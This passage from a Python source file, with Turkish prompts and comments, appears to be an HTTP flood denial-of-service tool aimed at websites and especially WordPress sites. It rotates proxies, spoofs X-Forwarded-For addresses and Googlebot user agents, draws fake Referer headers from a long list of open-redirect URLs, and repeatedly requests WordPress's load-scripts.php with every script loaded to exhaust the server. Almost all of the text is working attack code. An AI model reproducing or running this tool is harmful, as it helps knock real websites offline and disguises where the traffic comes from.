			"http://lyricstranslate.com/en/pagina-bianca-blank-page.html&amp;sa=U&amp;ved=0ahUKEwjXp5e876rMAhWIDpoKHQxEBlYQFgiiAjAw&amp;usg=AFQjCNHqd6kN4oLwutWPS_Obsg-xm1646gpagina=%s"%(url),
			"http://www.movescount.com/ru/?redirect_uri=%s"%(url),
			"http://webmail.netzero.net/?cf=spl&amp;start_page=5&amp;session_redirect=%s"%(url),
			"https://www.fastbot.de/red.php?red=32160420932010582827+http://www.addictivetips.com/internet-tips/google-chrome-proxy-server-settings/&amp;sa=U&amp;ved=0ahUKEwiSysuHkIjKAhVH1mMKHbhfC1AQFgh-MBQ&amp;usg=AFQjCNHbCfjam8qqZR7jBI8dHaLi7jMXTgproxy.php?=google.com%s"%(url),
			"https://www.fastbot.de/red.php?red=32160420932010582827+http://www.addictivetips.com/internet-tips/google-chrome-proxy-server-settings/&amp;sa=U&amp;ved=0ahUKEwj77tDAkojKAhVH0mMKHXlvCKAQFgh-MBQ&amp;usg=AFQjCNHbCfjam8qqZR7jBI8dHaLi7jMXTgproxy.php?=google.com%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?379701-google-and-other-on-proxy&amp;sa=U&amp;ved=0ahUKEwiSysuHkIjKAhVH1mMKHbhfC1AQFgjYAjA7&amp;usg=AFQjCNGzdkitQLUQkLTVSPa2-F_RHvdemwproxy.php?=google.com%s"%(url),
			"http://finance.google.ca/finance?q=NYSE:URI&amp;sa=U&amp;ved=0ahUKEwjy67XE76rMAhWrFZoKHemzD1cQFgh-MBE&amp;usg=AFQjCNFoD06uezYY6A1SATxawJOGDXRcPQ?uri=%s"%(url),
			"http://magazine.joomla.org/issues/issue-feb-2015/item/2525-revealing-joomla-s-seo-secrets-redirect-manager-com-redirect&amp;sa=U&amp;ved=0ahUKEwjH1qyo76rMAhUHlxoKHQdlDqkQFgjlATAj&amp;usg=AFQjCNFq2yTZ_6S-UtvHSDVookfNR2KHXQredirect=%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?379701-google-and-other-on-proxy&amp;sa=U&amp;ved=0ahUKEwj77tDAkojKAhVH0mMKHXlvCKAQFgjYAjA7&amp;usg=AFQjCNGzdkitQLUQkLTVSPa2-F_RHvdemwproxy.php?=google.com%s"%(url),
			"http://www.plastimart.co.za/wp-content/plugins/google-document-embedder/proxy.php?url=http://www.plastimart.co.za/wp-content/uploads/2012/04/Plastimart-Data-Sheet-PE0207-1.pdf&hl=en_US&embedded=true&amp;sa=U&amp;ved=0ahUKEwjg9-enmtPKAhXmG6YKHVdLCiwQFgiCAjAw&amp;usg=AFQjCNF3xc_glvR9yIycjtMhcvvAAoG-Pgproxy.php?url=1%s"%(url),
			"http://www.plastimart.co.za/wp-content/plugins/google-document-embedder/proxy.php?url=http://www.plastimart.co.za/wp-content/uploads/2012/04/Plastimart-Data-Sheet-PE0207-1.pdf&hl=en_US&embedded=true&amp;sa=U&amp;ved=0ahUKEwjjg67smdPKAhVG2qYKHdnDD64QFgiCAjAw&amp;usg=AFQjCNF3xc_glvR9yIycjtMhcvvAAoG-Pgproxy.php?url=1%s"%(url),
			"http://www.verticalworld.bg/product.php?id=265&amp;sa=U&amp;ved=0ahUKEwjf2-fnj7bKAhUFFiwKHc9xBc0QFgi6AzBL&amp;usg=AFQjCNHDFN17fw2tIZ4rVcgpY0yyP6YPgginurl:product.php?id=%s"%(url),
			"http://thechronicleherald.ca/novascotia/141787-openfile-news-site-on-hiatus&amp;sa=U&amp;ved=0ahUKEwjmp7S076rMAhVD6xoKHZ6XA00QFgjLATAg&amp;usg=AFQjCNEtGDZjYK0JknJDtvwxV1s46mHbxAopenfile=%s"%(url),
			"http://forum.freesteam.ru/away.php?s=%s"%(url),
			"http://opencart.ws/forum/away.php?s=%s"%(url),
			"http://engagethepower.org/wp-content/plugins/google-document-embedder/proxy.php?url=http://engagethepower.org/wp-content/uploads/Activity-Summary-Draft-1.pdf&hl=en_US&embedded=true&amp;sa=U&amp;ved=0ahUKEwjg9-enmtPKAhXmG6YKHVdLCiwQFghSMAw&amp;usg=AFQjCNEghPpHNVx14H8FNvdyTXD71Mdv9gproxy.php?url=1%s"%(url),
			"http://kindle-fire.in.ua/forum/away.php?s=%s"%(url),
			"http://gmod-fan.ru/forum/away.php?s=%s"%(url),
			"http://minecraft-rus.ru/forum/away.php?s=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwil-Mem76rMAhWCAJoKHS4DDIwQFgiVATAV&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.php.net/de/control-structures.goto.phpgoto=%s"%(url),
			"http://www.1national.ru/away.php?url=%s"%(url),
			"http://dle.in.ua/talk/away.php?s=%s"%(url),
			"http://forum.ostereo.ru/away.php?s=%s"%(url),
			"http://www.admotoscana.it/wp-content/plugins/google-document-embedder/proxy.php?url=http://www.admotoscana.it/wp-content/uploads/2014/09/A3-web-1-SMALLEST.pdf&hl=it&embedded=true&amp;sa=U&amp;ved=0ahUKEwjg9-enmtPKAhXmG6YKHVdLCiwQFgi_AjA_&amp;usg=AFQjCNGlqI_4c1MivmJKSPE_VxiIlzXqvQproxy.php?url=1%s"%(url),
			"http://www.admotoscana.it/wp-content/plugins/google-document-embedder/proxy.php?url=http://www.admotoscana.it/wp-content/uploads/2014/09/A3-web-1-SMALLEST.pdf&hl=it&embedded=true&amp;sa=U&amp;ved=0ahUKEwjjg67smdPKAhVG2qYKHdnDD64QFgi_AjA_&amp;usg=AFQjCNGlqI_4c1MivmJKSPE_VxiIlzXqvQproxy.php?url=1%s"%(url),
			"http://www.mycovermusic.com/ajax/popup.php?type=inscription&redirect_uri=%s"%(url),
			"http://santcom63.ru/forum/away.php?s=%s"%(url),
			"http://www.invalirus.ru/forum/away.php?s=%s"%(url),
			"http://www.aktau-business.com/forum/away.php?s=%s"%(url),
			"http://forums.asp.net/t/954304.aspx?Forms+Authentication+Disable+ReturnUrl&amp;sa=U&amp;ved=0ahUKEwjK6LSu76rMAhXl74MKHYKKAQcQFggbMAE&amp;usg=AFQjCNGou-pUeoa4kNv28gmA_sOwzerpHAreturnUrl=%s"%(url),
			"http://forum.my-yo.ru/away.php?s=%s"%(url),
			"http://cs.joensuu.fi/pages/bednarik/UE2006/rssgenr8.php?pageurl=%s"%(url),
			"http://www3.truecorp.co.th/auth/auth_ssov2/logout?redirect_uri=%s"%(url),
			"http://www.vueltaachihuahua.com/2009/proxy.php?url=%s"%(url),
			"http://library.calvin.edu/content/redirect/%s"%(url),
			"http://forms.ncl.ac.uk/view.php?id=2580&PageURL=%s"%(url),
			"http://www.myappwiz.info/home/redirect?targetUrl=%s"%(url),
			"http://www.unisigma.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://www.ubidoca.com/_en/print.php?pageURL=%s"%(url),
			"http://ja-gp-fukuoka.jp/php/proxy.php?url=&url=%s"%(url),
			"http://www.expandis.coop/bibliressources/pagessystem/iframepage.aspx?pageurl=%s"%(url),
			"https://laboutiquepuget.fr/login/fwd?redirect_uri=%s"%(url),
			"http://www.agylin.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&sa=U&ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgjGATAj&usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://berthoud-cn.isagri-ingenierie.fr/BibliRessources/PagesSystem/IFramePage.aspx?keywords=&PageUrl=%s"%(url),
			"http://www.tecnor-sofac.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://www.endtimescoming.com/articles.php?PageURL=%s"%(url),
			"http://www.isagri.es/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://loycetranchant.com/wp-content/themes/dt-chocolate/like_window.php?img=%s"%(url),
			"http://khalilyassirphotos.com/wp-content/themes/dt-chocolate/like_window.php?img=%s"%(url),
			"http://www.berthoud.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://www.iris.edu/hq/accounting/login?redir=%s"%(url),
			"http://www.karimbenamor.com/goto/index.asp?goto=%s"%(url),
			"http://whoiswrong.com/user/login/redir/%s"%(url),
			"http://ipdt.pt/?p=login&redir=%s"%(url),
			"http://www.isagri.pt/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://www.zanzana.net/goto.asp?goto=%s"%(url),
			"http://latinamerica.brother.com/LeavingOurSite.aspx?GoTo=%s"%(url),
			"http://jescobedo.com/wp-content/themes/dt-chocolate/like_window.php?img=%s"%(url),
			"http://it.groupeisa.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=%s"%(url),
			"http://www.euroinfopage.lv/company/?id=11575&goto=%s"%(url),
			"http://www.infolapas.lv/company/?id=27574&goto=%s"%(url),
			"http://www.motorsportentry.com/index.php/user/login/redir/%s"%(url),
			"http://vyazma.ru/goto/%s"%(url),
			"http://www.fif-orientering.dk/fif/index.asp?goto=%s"%(url),
			"http://www.xmarks.com/site/reviews/1/sso.capella.edu/amserver/UI/Login?goto=%s"%(url),
			"http://autoplanet1.com/redirect?goto=%s"%(url),
			"http://www.allgoodnewspaper.com/addons/ad_banners/clickthru.asp?bnrid=10&goto=%s"%(url),
			"http://www.mosgu.ru/nauchnaya/bitrix/redirect.php?event1=&event2=&event3=&goto=%s"%(url),
			"https://www.eoutlet4u.com/index.php?_a=login&redir=%s"%(url),
			"http://www.boyscouttrail.com/external_frame.asp?goto=%s"%(url),
			"http://www.bcs-urec.ru/bitrix/rk.php?goto=%s"%(url),
			"http://www.ustinova.ru/bitrix/rk.php?goto=%s"%(url),
			"http://www.koreandramafc.com/out/?goto=%s"%(url),
			"http://www.mckenzieinstitute.org/Security/login?BackURL=%s"%(url),
			"http://www.kurtztrucking.com/Security/login?BackURL=%s"%(url),
			"http://opencompute.org/Security/login?BackURL=%s"%(url),
			"http://www.skylineonline.ca/Security/login?BackURL=%s"%(url),
			"http://www.sparkscience.ca/Security/login?BackURL=%s"%(url),
			"http://www.edchipman.ca/Security/login?BackURL=%s"%(url),
			"http://kikuly.sextgem.com/phong-chat/index.php?room=admin&i=49&url=%s"%(url),
			"http://www.nad.org.nz/Security/login?BackURL=%s"%(url),
			"http://www.dombinnov.fr/Security/login?BackURL=%s"%(url),
			"http://www.library.umass.edu/Security/login?BackURL=%s"%(url),
			"http://www.nzieh.org.nz/Security/login?BackURL=%s"%(url),
			"http://www.crcsi.com.au/Security/login?BackURL=%s"%(url),
			"http://vapesense.co.uk/instamember/?imhandler=login&redir=%s"%(url),
			"https://www.sustainableplant.com/Security/login?BackURL=%s"%(url),
			"http://cesa.org/Security/login?BackURL=%s"%(url),
			"https://www.glenfiddich.com/Security/login?BackURL=%s"%(url),
			"http://www.milkeneducatorawards.org/Security/login?BackURL=%s"%(url),
			"http://www.odysseywallcoverings.com/Security/login?BackURL=%s"%(url),
			"http://gymkengymnastics.com/Security/login?BackURL=%s"%(url),
			"http://www.siddharthasintent.org/Security/login?BackURL=%s"%(url),
			"http://silverstripe-foundation.com/Security/login?BackURL=%s"%(url),
			"http://www.indiainfoline.com/user/login?backurl=%s"%(url),
			"http://www.montereycountypops.org/Security/login?BackURL=%s"%(url),
			"https://www.eat.co.nz/Security/login?BackURL=%s"%(url),
			"http://www.genesis-marine.com/Security/login?BackURL=%s"%(url),
			"http://www.internal-displacement.org/Security/login?BackURL=%s"%(url),
			"https://www.uk-assignments.com/Security/login?BackURL=%s"%(url),
			"http://repcoii.com/Security/login?BackURL=%s"%(url),
			"http://www.bpa.org.uk/Security/login?BackURL=%s"%(url),
			"https://www.cciq.com.au/Security/login?BackURL=%s"%(url),
			"http://www.queensclub.com.au/Security/login?BackURL=%s"%(url),
			"http://www.olivefarmwines.com/Security/login/login?BackURL=%s"%(url),
			"http://www.raca.com.au/Security/login?BackURL=%s"%(url),
			"http://www.theatreroyal.com/Security/login?BackURL=%s"%(url),
			"http://learningstaircase.co.nz/Security/login?BackURL=%s"%(url),
			"https://www.technogadgets.com.sg/store/index.php?_a=login&redir=%s"%(url),
			"http://dacd.win/b.php?b=4&u=%s"%(url),
			"http://spell-write.nz/Security/login?BackURL=%s"%(url),
			"http://www.akentishceremony.com/Security/login?BackURL=%s"%(url),
			"http://www.aquariitech.com/Security/login?BackURL=%s"%(url),
			"http://www.fosterconversation.com/Security/login?BackURL=%s"%(url),
			"http://www.radimage.info/Security/login?BackURL=%s"%(url),
			"http://www.centerforirishmusic.org/Security/login?BackURL=%s"%(url),
			"http://www.archbishopholgates.org/Security/login?BackURL=%s"%(url),
			"http://www.pilatesfoundation.com/Security/login?BackURL=%s"%(url),
			"http://infotechenterprises.com/Security/login?BackURL=%s"%(url),
			"http://www.alexandraclub.com.au/Security/login?BackURL=%s"%(url),
			"http://www.chillout.co.nz/Security/login?BackURL=%s"%(url),
			"https://www.browserling.com/browse/win/vista/chrome/49/%s"%(url),
			"http://www.warwickartscentre.co.uk/Security/login?BackURL=%s"%(url),
			"http://motatapu.com/Security/login?BackURL=%s"%(url),
			"https://www.browserling.com/browse/win/vista/ie/9/%s"%(url),
			"http://www.workchoice.co.nz/Security/login?BackURL=%s"%(url),
			"http://www.vxsport.com/Security/login?BackURL=%s"%(url),
			"http://ecvd.org/Security/login?BackURL=%s"%(url)]
	dexx1=random.choice(dex)
	return dexx1
dexdex = """/wp-admin/load-scripts.php?c=1&load[]=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9.1"""
	
    
def baslatdex():
    global url
    global url2
    global urlport
    url = raw_input("Url giriniz.= ")
    
    if url == "":
        print ("url giriniz.")
        baslatdex()
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("urlde hata var tekrar gir.")
        baslatdex()
    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
    try:
            urlport="80"
    except:
        print( "Hata")
    proxylist()
def proxylist():
	global prxokuma
	try:
		cdosya = raw_input("Proxy dosya adini giriniz. = ")
		prxokuma = open(cdosya).readlines()
		proxyoku()
		numthreads()
	except EnvironmentError as exc: 
		if exc.errno == 2:
			print "dosya bulunamadi lutfen tekrar giriniz."
			proxylist()
def numthreads():
	global threads
	try:
		threads = input("Threads Degerini giriniz. Ayni anda Kac ip ile atak yapsin = ")
		
	except NameError:
		print ("Sadece rakam giriniz \n")
		numthreads()
	gucc()
def gucc():
	global guc
	try:
		guc = input("ayni ip tek seferde kac post yollamak istersiniz = ")
	except NameError:
		print("tekrar deneyiniz Harf icermesin rakamlardan olussun .\n")
		gucc()
	begin()
def begin():
	agentsor()
def agentsor():
	normalmidegilmi=raw_input("Normal agentle icin \"0\" , Google agent atak icin \"1\" tuslayiniz. = ")
	if normalmidegilmi=="0":
		normalwpataksor()
	elif normalmidegilmi=="1":
		googlewpataksor()
	if normalmidegilmi != "0" and normalmidegilmi != "1":
		print (" Ya 0 yada 1 tuslayiniz.Tekrar deneyini,")
		agentsor()
def normalwpataksor():
	nwpatak=raw_input("Wordpress atak yapmak istiyormusunuz (Y/N) giriniz= ")
	if nwpatak=="Y":
		wpatakcesit=raw_input("Load-scripts atak icin \"0\" - search random atak icin \"1\" tuslayiniz = ")
		if wpatakcesit=="0":
			bbnormalwpload()
			normalwpload()
		if wpatakcesit=="1":
			bbnormalwprandom()
			normalwprandom()
		if wpatakcesit !="0" and wpatakcesit !="1":
			print ("Ya \"0\" yada \"1\" giriniz. tekrar deneyiniz")
			normalwpataksor()
	if nwpatak=="N":
		rndrastdizin()
	if nwpatak !="N" and nwpatak !="Y":
		print ("Yanlis giris yaptiniz tekrar deneyin")
		normalwpataksor()
def rndrastdizin():
	rndsor=raw_input("Ana dizine /randomdizin atak yapmak istiyormusunuz (Y/N) giriniz. = ")
	if rndsor=="Y":
		bbnormaldizinrandom()
		normaldizinrandom()
	if rndsor=="N":
		bb()
		basladex()
		
	if rndsor !="N" and rndsor !="Y":
		print ("Yanlis giris yaptiniz tekrar deneyiniz")
		normalwpataksor()
###################google sorgulari##################
def googlewpataksor():
	nwpatak=raw_input("Wordpress atak yapmak istiyormusunuz (Y/N) giriniz= ")
	if nwpatak=="Y":
		wpatakcesit=raw_input("Load-scripts atak icin \"0\" - search random atak icin \"1\" tuslayiniz = ")
		if wpatakcesit=="0":
			bbgooglewpload()
			googlewpload()
		if wpatakcesit=="1":
			bbgooglewprandom()
			googlewprandom()
		if wpatakcesit !="0" and wpatakcesit !="1":
			print ("Ya \"0\" yada \"1\" giriniz. tekrar deneyiniz")
			googlewpataksor()
	if nwpatak=="N":
		rndrastdizinn()
	if nwpatak !="N" and nwpatak !="Y":
		print ("Yanlis giris yaptiniz tekrar deneyin")
		googlewpataksor()
def rndrastdizinn():
	rndsor=raw_input("Ana dizine /randomdizin atak yapmak istiyormusunuz (Y/N) giriniz. = ")
	if rndsor=="Y":
		bbgoogledizinrandom()
		googledizinrandom()
	if rndsor=="N":
		bbgooglebasladex()
		googlebasladex()
	if rndsor !="N" and rndsor !="Y":
		print ("Yanlis giris yaptiniz tekrar deneyiniz")
		rndrastdizinn()

def agentt():
    age=random.choice(useragents)
    return age
def googleagent():
	age=random.choice(googleuseragents)
	return age
def quen():
	pass
def kontrol1():
    global kaynak
    kaynak=[]
    kontrol2()
def kontrol2():
    global kaynak
    for i in kntr:
        kaynak.append(i)
     
def proxyoku():
    for i in prxokuma:
        x=i.replace("\n","")
        kaynak.append(x)
        kntr.append(x)
        #print "okunuyor"
     

    
    

def basladex():
 
 while True:
    try:
        getkodu = "GET " + url + "/ HTTP/1.1\r\nHost: " + url2 + "\r\n" 
        useragent = "User-Agent: " + agentt() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
            
def normalwprandom():
 while True:
    try:
        getkodu = "GET " + url + "/?s=%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
        useragent = "User-Agent: " + agentt() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
        
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
def normalwpload():
 while True:
    try:
        getkodu = "GET " + url + "%s HTTP/1.1\r\nHost: "%(dexdex) + url2 + "\r\n" 
        useragent = "User-Agent: " + agentt() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
def normaldizinrandom():
 while True:
    try:
        getkodu = "GET " + url + "/%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
        useragent = "User-Agent: " + agentt() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
            
            


################googlebolumu###############

def googlebasladex():
 while True:
    try:
        getkodu = "GET " + url + "/ HTTP/1.1\r\nHost: " + url2 + "\r\n" 
        useragent = "User-Agent: " + googleagent() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
def googledizinrandom():
 while True:
    try:
        getkodu = "GET " + url + "/%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
        useragent = "User-Agent: " + googleagent() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
def googlewpload():
 while True:
    try:
        getkodu = "GET " + url + "%s HTTP/1.1\r\nHost: "%(dexdex) + url2 + "\r\n" 
        useragent = "User-Agent: " + googleagent() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
        request = getkodu + useragent + kabul + ilericik + str(refererx) + baglantisi + "\r\n"
        proxy = random.choice(prxokuma).strip().split(":")
        
         
        socket.setdefaulttimeout(0.5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode(request))
        print ("Paket yollandi. " + str(proxy[0]+":"+proxy[1])) 
        try: 
            for y in range(int(guc)): 
                s.send(str.encode(request))
        except socket.timeout:
         #   print "zaman asimi"
            pass
        except EnvironmentError as exc: 
            if exc.errno == errno.ECONNREFUSED:
       #        print "bag hatasi"
               pass
      #  s.close()
    except socket.timeout:
       # print "zaman asimi"
        pass
    except EnvironmentError as exc: 
        if exc.errno == errno.ECONNREFUSED:
    #        print "bag hatasi"
            pass
def googlewprandom():
 while True:
    try:
        getkodu = "GET " + url + "/?s=%s HTTP/1.1\r\nHost: "%(dex()) + url2 + "\r\n" 
        useragent = "User-Agent: " + googleagent() + "\r\n"
        kabul = random.choice(butunkabul)
        refererx = "Referer: "+ refererdex()+"\r\n"
        dexipcik = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        ilericik = "X-Forwarded-For: " + dexipcik + "\r\n"
